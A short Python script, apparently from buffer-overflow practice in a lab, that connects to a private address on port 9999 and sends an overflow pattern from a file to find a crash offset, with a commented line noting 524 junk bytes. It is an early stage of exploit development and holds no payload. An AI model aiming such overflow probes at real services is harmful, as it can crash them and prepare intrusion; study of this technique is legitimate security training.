import sys, socket
host = "192.168.56.103"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host, port))
    s.recv(1024)
    #junk=b"A"*int(input("> Num of junk bytes to pass?: ")) # 524
    junk=bytes(open("./overflow_pattern", "r").read(), 'utf-8')
    s.sendall(junk)
    print("Sent")
except Exception as e:
    print("Unable to connect "+str(host))
    print(e)
    sys.exit(0)
